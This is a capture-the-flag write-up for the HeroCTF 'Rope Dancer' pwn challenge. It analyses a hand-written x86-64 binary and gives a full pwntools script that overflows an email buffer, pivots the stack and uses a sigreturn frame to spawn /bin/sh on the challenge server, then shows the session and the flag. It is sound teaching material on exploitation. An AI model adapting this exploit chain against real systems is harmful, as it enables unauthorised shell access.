# Rope Dancer

### Category

Pwn

### Description

A circus has just opened near you and you would love to work there as a rope dancer. Perhaps you could access their recruitment criteria to maximize your chances of being selected?

Format : Hero{flag}<br>
Author : SoEasY

### Files

- [ropedancer](ropedancer)

### Write Up

First of all, let's take some informations about the binary:
```bash
$ file ropedancer  
ropedancer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped

$ checksec ./ropedancer
[*] '/home/soeasy/GitHub/HeroCTF_v5/Pwn/Rope_Dancer/ropedancer'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

So we have an x64 ELF, and the checksec output is typicall of hand-written assembly challenges, only using syscalls. Let's launch the binary.

```bash
$  ./ropedancer   
Hello. So, you want to be a ROPedancer? A
Well, let me know if you change your mind.
                                                                                    
$ ./ropedancer
Hello. So, you want to be a ROPedancer? yes
Alright. Please enter an email on which we can contact you: okokookok
This is not a valid email, don't waste my time.

$ ./ropedancer
Hello. So, you want to be a ROPedancer? yes
Alright. Please enter an email on which we can contact you: ok@gmail.com
Thanks. You have 400 characters to convince me to hire you: zjdpizjdpijzdipjapidjza
We will get back to you soon. Good bye.
```

Alright, we are asked for 3 inputs: a "yes/no", an email and a motivation letter. Let's look at the code in IDA.

```c
void __noreturn start()
{
  signed __int64 v0; // rax
  signed __int64 v1; // rax
  signed __int64 v2; // rax
  signed __int64 v3; // rax
  int buffer_yes_no; // [rsp+0h] [rbp-4h] BYREF

  v0 = sys_write(1u, "Hello. So, you want to be a ROPedancer? ", 0x29uLL);
  v1 = sys_read(0, (char *)&buffer_yes_no, 4uLL);
  if ( buffer_yes_no == '\nsey' )
  {
    v2 = sys_write(1u, "Alright. Please enter an email on which we can contact you: ", 0x3DuLL);
    get_motivation_letter();
  }
  else
  {
    v3 = sys_write(1u, "Well, let me know if you change your mind.\n", 0x2CuLL);
  }
  exit(1);
}
```

Let's look at the function `get_motivation_letter()`:
```c
signed __int64 get_motivation_letter()
{
  signed __int64 v0; // rax
  bool is_email_valid; // al
  signed __int64 v2; // rax
  signed __int64 result; // rax
  char email[16]; // [rsp+0h] [rbp-10h] BYREF

  v0 = sys_read(0, email, 100uLL);
  is_email_valid = check_email(email);
  if ( *&is_email_valid )
  {
    __asm { syscall; LINUX - sys_write }
    v2 = sys_read(0, motivation_letter, 500uLL);
    return sys_write(1u, "We will get back to you soon. Good bye.\n", 0x29uLL);
  }
  else
  {
    result = 1LL;
    __asm { syscall; LINUX - sys_write }
  }
  return result;
}
```

We can here notice a buffer overflow in the `email` stach buffer. By the way, we can also see a buffer overflow in the bss buffer `motivation_letter` (size of 400, read of 500 bytes) but afet testing this one isn't usefull at all (it actually that I forgot to reduce the input from 500 to 400 lmao).

So we've got a stack buffer overflow on the email, but how do we exploit it ?

If we take a look at the gadgets ending by RET, there are only a fex gadgets:
```bash
$ ROPgadget --binary ./ropedancer | grep ret
0x000000000040110f : add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0x5dec8948 ; ret
0x0000000000401111 : add byte ptr [rdi], cl ; add eax, 0x5dec8948 ; ret
0x0000000000401113 : add eax, 0x5dec8948 ; ret
0x0000000000401116 : in al, dx ; pop rbp ; ret
0x0000000000401013 : inc al ; ret
0x0000000000401010 : int1 ; xor eax, eax ; inc al ; ret
0x0000000000401115 : mov esp, ebp ; pop rbp ; ret
0x0000000000401114 : mov rsp, rbp ; pop rbp ; ret
0x0000000000401117 : pop rbp ; ret
0x0000000000401015 : ret
0x0000000000401012 : sar dh, 0xc0 ; ret
0x0000000000401011 : xor eax, eax ; inc al ; ret
```

The intended exploitation was the following:
- stack pivot to `motivation_letter` using `pop rbp ; ret` & `mov rsp, rbp ; pop rbp ; ret`
- `inc al ; ret` * 0xf and SYS_SIGRETURN to make an SROP

My solving script:

```py
from pwn import *

context.binary = ELF("./ropedancer")

# r = process("./ropedancer")
r = remote("static-03.heroctf.fr", 5002)

r.sendlineafter(b"be a ROPedancer? ", b"yes")

# Gadgets
mov_rsp_rbp_pop_rbp = 0x401114 # mov rsp, rbp ; pop rbp ; ret
pop_rbp             = 0x401117 # pop rbp ; ret
xor_rax_inc_al      = 0x401011 # xor eax, eax ; inc al ; ret
inc_al              = 0x401013 # inc al ; ret
syscall             = 0x40102f # syscall
motivation_letter   = 0x40312C

# 16 + 8 (rbp save) = 24 characters
rop1 = b'our.fake.email@gmail.com'

# Stack pivot to motivation_letter
rop1 += p64(pop_rbp)
rop1 += p64(motivation_letter)

rop1 += p64(mov_rsp_rbp_pop_rbp)
rop1 += p64(motivation_letter)

log.success(f"1st ROP length: {len(rop1)}")
r.sendlineafter(b"contact you: ", rop1)

###########################################

srop_frame = SigreturnFrame()
srop_frame.rax = constants.SYS_execve
srop_frame.rdi = motivation_letter
srop_frame.rsi = 0
srop_frame.rdx = 0
srop_frame.rip = syscall

# SYS_SIGRETURN (rax=0xf)
rop2 = b"/bin/sh\x00"
rop2 += p64(xor_rax_inc_al)
rop2 += p64(inc_al) * 0xe
rop2 += p64(syscall)
rop2 += bytes(srop_frame)

print(srop_frame.keys())

log.success(f"2nd ROP length: {len(rop2)}")
r.sendlineafter(b"hire you: ", rop2)
r.interactive()
```

Execution:
```bash
$ python3 solve.py
[*] '/home/soeasy/GitHub/HeroCTF_v5/Pwn/Rope_Dancer/ropedancer'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to static-03.heroctf.fr on port 5002: Done
[+] 1st ROP length: 56
dict_keys(['uc_flags', '&uc', 'uc_stack.ss_sp', 'uc_stack.ss_flags', 'uc_stack.ss_size', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15', 'rdi', 'rsi', 'rbp', 'rbx', 'rdx', 'rax', 'rcx', 'rsp', 'rip', 'eflags', 'csgsfs', 'err', 'trapno', 'oldmask', 'cr2', '&fpstate', '__reserved', 'sigmask'])
[+] 2nd ROP length: 384
[*] Switching to interactive mode
\x00We will get back to you soon. Good bye.
\x00$ id
uid=1000(player) gid=1001(player) groups=1001(player),1000(ctf)
$ ls
entry.sh
ropedancer
selection_criterias.txt
$ cat selection_criterias.txt
- Must be able to balance on a tightrope while wearing clown shoes and juggling flaming rubber chickens
- Able to perform tightrope tricks while reciting Shakespearean sonnets in pig Latin
- Must possess the unique ability to hypnotize audiences using only the power of interpretative dance while on a tightrope
- Capable of performing the entire "Thriller" dance routine from Michael Jackson on a tightrope, while also dressed as a zombie
- Exceptional at tightrope walking while wearing a blindfold and navigating solely by echolocation, like a bat
- Must be able to tightrope walk while simultaneously making balloon animals for an audience of highly discerning squirrels
- Proficient in tightrope walking while wearing a sumo wrestler suit and maintaining perfect balance, even in strong winds
- Able to balance on a tightrope while holding a tray of delicate teacups, ensuring not a single drop of tea is spilled
- Expert in tightrope walking while solving a Rubik's Cube, playing the accordion, and wearing a full suit of medieval armor while screaming "Hero{1_w4nN4_b3_4_R0P3_D4nC3r_s0_b4d!!!}"
- Must be able to recite the entire periodic table of elements backwards, while walking on a tightrope suspended over a pool of hungry alligators
```

### Flag

```
Hero{1_w4nN4_b3_4_R0P3_D4nC3r_s0_b4d!!!}
```
